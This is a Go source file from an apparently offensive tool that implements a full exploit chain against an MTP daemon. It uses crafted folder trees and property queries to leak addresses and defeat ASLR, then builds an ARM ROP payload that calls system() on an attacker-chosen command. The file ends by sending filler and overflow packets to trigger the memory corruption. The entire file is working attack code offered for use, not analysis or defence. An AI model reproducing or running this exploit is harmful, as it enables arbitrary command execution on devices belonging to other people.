// Package chain implements the Bug-2 leak harvest, the address math, the Bug-3
// payload layout and the trigger sequence.
package chain

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"time"

	"shadow/internal/mtp"
)

const (
	// Payload layout, source offsets inside the 1024-byte recycled chunk.
	// Copy maps source offset o -> S + 0x14 + o for o >= 12.
	srcBase      = 0x14
	strOff       = 0x74
	slotR7Src    = 0x4c // saved r7
	slotLRSrc    = 0x50 // saved LR -> pop gadget
	slotR3Src    = 0x58 // popped r3 -> system()
	slotPCSrc    = 0x68 // popped pc -> ldr/blx gadget
	slotArgSrc   = 0x6c // [r7+44] -> command string
	savedR7Delta = 0x54 // r7 := S + 0x54
	strAddrDelta = srcBase + strOff
	fillerLen    = 1024
	fillerTID    = 0x77
	dummyTID     = 0x71
	overflowTID  = 0x78

	// DefaultFillers must be ODD: even counts flip the phase parity.
	DefaultFillers = 3
)

// Params are the per-firmware constants the chain needs.
type Params struct {
	System       uint32
	PopGadget    uint32
	LdrBlxGadget uint32
	GotBase      uint32
	StackDelta   uint32
	Slot4RawOff  int
	Slot16RawOff int
	AnchorLow12  uint32
}

// Hit is a successful leak probe.
type Hit struct {
	PieWord uint32
	P16     uint32
	Tag     string
}

// LeakWord validates a raw DC08 probe response against the leak layout.
func LeakWord(raw []byte, slot4Off, slot16Off int, anchorLow12 uint32) (uint32, uint32, bool) {
	if len(raw) < 18 || slot4Off+4 > len(raw) || slot16Off+4 > len(raw) {
		return 0, 0, false
	}
	pieWord := binary.LittleEndian.Uint32(raw[slot4Off:])
	p16 := binary.LittleEndian.Uint32(raw[slot16Off:])
	if pieWord&0xfff != 0 || p16&0xfff != anchorLow12 {
		return 0, 0, false
	}
	return pieWord, p16, true
}

// Solve derives the PIE base and the receiver frame from a leak hit.
func Solve(hit Hit, p Params) (uint32, uint32, error) {
	pie := hit.PieWord - p.GotBase
	if pie&0xfff != 0 {
		return 0, 0, fmt.Errorf("PIE base %#x is not page-aligned", pie)
	}
	if hit.P16 < p.StackDelta {
		return 0, 0, fmt.Errorf("implausible stack delta %#x (anchor %#x)", p.StackDelta, hit.P16)
	}
	s := hit.P16 - p.StackDelta
	return pie, s, nil
}

// Harvest runs the Bug-2 leak recipe in the current daemon process and returns
// the first well-formed hit.
func Harvest(c *mtp.Client, p Params, log mtp.LogFunc) (Hit, error) {
	probe := func(handle uint32, tag string) (Hit, bool, error) {
		pkts, err := c.GetObjectPropValue(handle, mtp.PropObjectName, time.Second)
		if err != nil {
			return Hit{}, false, err
		}
		raw := mtp.DataPayload(pkts)
		if len(raw) < 18 {
			return Hit{}, false, nil
		}
		if log != nil {
			log("HIT %-20s n=%-3d raw=%s", tag, len(raw)/2, hex.EncodeToString(raw))
		}
		if pieWord, p16, ok := LeakWord(raw, p.Slot4RawOff, p.Slot16RawOff, p.AnchorLow12); ok {
			return Hit{PieWord: pieWord, P16: p16, Tag: tag}, true, nil
		}
		return Hit{}, false, nil
	}

	// Baseline tree: the preamble that makes the timestring residue appear.
	for k := 0; k < 9; k++ {
		if _, err := c.MakeFolder(rname(6, -1), mtp.ObjectHandleRoot); err != nil {
			return Hit{}, err
		}
	}
	a, err := c.MakeFolder(rname(199, -1), mtp.ObjectHandleRoot)
	if err != nil {
		return Hit{}, err
	}
	b, err := c.MakeFolder(rname(199, -1), a)
	if err != nil {
		return Hit{}, err
	}
	nest, err := c.MakeFolder(rname(199, -1), b)
	if err != nil {
		return Hit{}, err
	}
	f, err := c.MakeFolder(rname(245, -1), mtp.ObjectHandleRoot)
	if err != nil {
		return Hit{}, err
	}
	if _, err := c.MakeFolder(rname(200, -1), f); err != nil {
		return Hit{}, err
	}
	real, err := c.MakeFolder(rname(4, -1), mtp.ObjectHandleRoot)
	if err != nil {
		return Hit{}, err
	}
	child, err := c.MakeFolder(rname(4, -1), real)
	if err != nil {
		return Hit{}, err
	}
	if err := c.MoveObject(f, mtp.StoreInternal, nest); err != nil {
		return Hit{}, err
	}

	ops := []struct {
		tag    string
		params []uint32
	}{
		{"handlesRoot", []uint32{mtp.StoreInternal, 0, mtp.ObjectHandleRoot}},
		{"handlesReal", []uint32{mtp.StoreInternal, 0, real}},
		{"handlesChild", []uint32{mtp.StoreInternal, 0, child}},
		{"handlesAll", []uint32{mtp.StoreInternal, 0, 0}},
		{"handlesAssoc", []uint32{mtp.StoreInternal, mtp.FormatAssoc, mtp.ObjectHandleRoot}},
	}
	for _, length := range []int{8, 12, 16, 20, 24, 32, 40, 60, 100, 140, 180, 240} {
		tpos := -1
		if length > 8 {
			tpos = 8
		}
		ghost, err := c.MakeFile(rname(length, tpos), mtp.ObjectHandleRoot, 0)
		if err != nil {
			return Hit{}, err
		}
		for _, op := range ops {
			if _, err := c.Command(mtp.OpGetObjectHandles, op.params, 1, 800*time.Millisecond); err != nil {
				return Hit{}, err
			}
			hit, ok, err := probe(ghost, fmt.Sprintf("L=%d %s", length, op.tag))
			if err != nil {
				return Hit{}, err
			}
			if ok {
				return hit, nil
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
	return Hit{}, fmt.Errorf("no leak this run")
}

// Payload is the three packets of the trigger sequence.
type Payload struct {
	Filler   []byte
	Dummy    []byte
	Overflow []byte
	N        uint32
	StrAddr  uint32
}

// BuildPayload lays out the chain in a 1024-byte invalid container and the two
// 36-byte trigger containers.
func BuildPayload(pie, s uint32, p Params, cmd string) (Payload, error) {
	cmdBytes := append([]byte(cmd), 0)
	if strOff+len(cmdBytes) > fillerLen {
		return Payload{}, fmt.Errorf("command too long (%d bytes, max %d)", len(cmd), fillerLen-strOff-1)
	}
	strAddr := (s + strAddrDelta) & 0xffffffff

	filler := make([]byte, fillerLen)
	binary.LittleEndian.PutUint32(filler[0:], fillerLen)
	binary.LittleEndian.PutUint16(filler[4:], mtp.TypeCommand)
	binary.LittleEndian.PutUint16(filler[6:], mtp.OpGetDeviceInfo)
	binary.LittleEndian.PutUint32(filler[8:], fillerTID)
	copy(filler[strOff:], cmdBytes)

	put := func(off int, val uint32) {
		binary.LittleEndian.PutUint32(filler[off:], val)
	}
	put(0x48, 0)
	put(slotR7Src, (s+savedR7Delta)&0xffffffff)  // saved r7 -> S+0x54
	put(slotLRSrc, (pie+p.PopGadget)&0xffffffff) // saved LR -> pop gadget
	put(0x54, 0)
	put(slotR3Src, (pie+p.System)&0xffffffff) // r3 -> system()
	put(0x5c, 0)
	put(0x60, 0)
	put(0x64, 0)
	put(slotPCSrc, (pie+p.LdrBlxGadget)&0xffffffff) // pc -> ldr r0,[r7,#44]; blx r3
	put(slotArgSrc, strAddr)                        // [r7+44] -> command string

	lastDword := ((strOff + len(cmdBytes) - 1) / 4) * 4
	n := uint32((lastDword-12)/4 + 1)

	dummy := make([]byte, 36)
	binary.LittleEndian.PutUint32(dummy[0:], 36)
	binary.LittleEndian.PutUint16(dummy[4:], mtp.TypeCommand)
	binary.LittleEndian.PutUint16(dummy[6:], mtp.OpGetDeviceInfo)
	binary.LittleEndian.PutUint32(dummy[8:], dummyTID)
	binary.LittleEndian.PutUint32(dummy[32:], 0x40)

	over := make([]byte, 36)
	binary.LittleEndian.PutUint32(over[0:], 36)
	binary.LittleEndian.PutUint16(over[4:], mtp.TypeCommand)
	binary.LittleEndian.PutUint16(over[6:], mtp.OpGetDeviceInfo)
	binary.LittleEndian.PutUint32(over[8:], overflowTID)
	binary.LittleEndian.PutUint32(over[32:], n)

	return Payload{Filler: filler, Dummy: dummy, Overflow: over, N: n, StrAddr: strAddr}, nil
}

// Fire sends the trigger sequence: N odd fillers, the phase-reset dummy and
// the overflowing container.
func Fire(c *mtp.Client, fillers int, pl Payload, log mtp.LogFunc) error {
	if fillers <= 0 {
		fillers = DefaultFillers
	}
	for i := 0; i < fillers; i++ {
		if err := c.Send(pl.Filler); err != nil {
			return err
		}
		time.Sleep(400 * time.Millisecond)
	}
	if err := c.Send(pl.Dummy); err != nil {
		return err
	}
	time.Sleep(300 * time.Millisecond)
	if err := c.Send(pl.Overflow); err != nil {
		return err
	}
	if log != nil {
		log("payload sent")
	}
	time.Sleep(2 * time.Second)
	return nil
}

// rname builds a random MTP name; tpos >= 0 plants a 'T' at that index.
func rname(n, tpos int) string {
	b := []byte(mtp.RandName(n))
	if tpos >= 0 && tpos < n {
		b[tpos] = 'T'
	}
	return string(b)
}
